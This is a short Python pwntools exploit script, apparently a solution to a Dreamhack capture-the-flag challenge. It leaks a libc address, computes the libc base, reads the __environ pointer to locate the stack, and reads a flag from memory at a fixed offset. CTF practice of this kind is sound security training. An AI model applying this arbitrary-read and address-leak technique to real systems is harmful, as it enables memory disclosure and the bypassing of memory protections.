#!/usr/bin/env python3

from pwn import *

exe = ELF("./environ_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 18893)

    return r


def main():
    r = conn()

    r.recvuntil(b"stdout: ")
    _io_2_1_stdout_ = int(r.recvline()[:-1], 16)

    libc_base = _io_2_1_stdout_ - libc.symbols["_IO_2_1_stdout_"]
    __environ = libc_base + libc.symbols["__environ"]

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Addr: ", str(__environ).encode())

    envp_stack = u64(r.recvn(6).ljust(8, b"\x00"))
    flag_stack = envp_stack - 0x1568

    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"Addr: ", str(flag_stack).encode())
    
    flag = r.recvline()[:-1]

    log.success(f"FLAG : {flag.decode()}")

if __name__ == "__main__":
    main()
